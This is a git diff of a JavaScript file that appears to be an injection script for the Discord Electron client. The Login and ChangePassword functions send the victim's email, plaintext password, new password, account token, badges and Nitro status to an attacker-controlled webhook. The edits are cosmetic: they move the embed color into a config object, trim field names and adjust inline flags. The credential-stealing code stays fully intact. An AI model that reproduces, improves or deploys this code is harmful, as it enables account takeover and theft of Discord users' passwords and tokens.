@@ -4,6 +4,10 @@ const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
+const config = {
+    "clr": 3092790
+}
+
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "stenko"))) {
         return !0
@@ -187,17 +191,17 @@ function Login(email, password, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
-                    "title": " user logged in",
+                    "title": "user logged in",
 		    "description": "᲼᲼᲼᲼",
-                    "color": 3092790,
+                    "color": config["clr"],
                     "fields": [
                         {
-                            "name": " name",
+                            "name": "name",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
-                            "inline": true
+                            "inline": false
                         },
                         {
-                            "name": " id",
+                            "name": "id",
                             "value": `\`` + json.id + `\``,
                             "inline": true
                         },
@@ -207,12 +211,12 @@ function Login(email, password, token) {
                             "inline": false
                         },
                         {
-                            "name": " email",
+                            "name": "email",
                             "value": `\`${email}\``,
-                            "inline": true
+                            "inline": false
                         },
                         {
-                            "name": " password",
+                            "name": "password",
                             "value": `\`${password}\``,
                             "inline": true		    
                         },
@@ -222,12 +226,12 @@ function Login(email, password, token) {
                             "inline": false
                         }, 
                         {
-                            "name": " badges",
+                            "name": "badges",
                             "value": `\`${GetBadges(json.flags)}\``,
-                            "inline": true		    
+                            "inline": false		    
                         },
                         {
-                            "name": " nitro",
+                            "name": "nitro",
                             "value": `\`${GetNitro(json.premium_type)}\``,
                             "inline": true		    
                         },
@@ -237,7 +241,7 @@ function Login(email, password, token) {
                             "inline": false
                         }, 
                         {
-                            "name": " token",
+                            "name": "token",
                             "value": `\`${token}\``,
                             "inline": false
                         }
@@ -276,15 +280,15 @@ function ChangePassword(email, newpassword, token) {
                 {
                     "title": "password changed",
 		    "description": "᲼᲼᲼᲼",
-                    "color": 3092790,
+                    "color": config["clr"],
                     "fields": [
                         {
-                            "name": " name",
+                            "name": "name",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
-                            "inline": true
+                            "inline": false
                         },
                         {
-                            "name": " id",
+                            "name": "id",
                             "value": `\`` + json.id + `\``,
                             "inline": true
                         },
@@ -294,12 +298,12 @@ function ChangePassword(email, newpassword, token) {
                             "inline": false
                         },
                         {
-                            "name": " email",
+                            "name": "email",
                             "value": `\`${email}\``,
-                            "inline": true
+                            "inline": false
                         },
                         {
-                            "name": " new password",
+                            "name": "new password",
                             "value": `\`${newpassword}\``,
                             "inline": true		    
                         },
@@ -309,12 +313,12 @@ function ChangePassword(email, newpassword, token) {
                             "inline": false
                         }, 
                         {
-                            "name": " badges",
+                            "name": "badges",
                             "value": `\`${GetBadges(json.flags)}\``,
-                            "inline": true		    
+                            "inline": false		    
                         },
                         {
-                            "name": " nitro",
+                            "name": "nitro",
                             "value": `\`${GetNitro(json.premium_type)}\``,
                             "inline": true		    
                         },
@@ -324,7 +328,7 @@ function ChangePassword(email, newpassword, token) {
                             "inline": false
                         }, 
                         {
-                            "name": " token",
+                            "name": "token",
                             "value": `\`${token}\``,
                             "inline": false
                         }
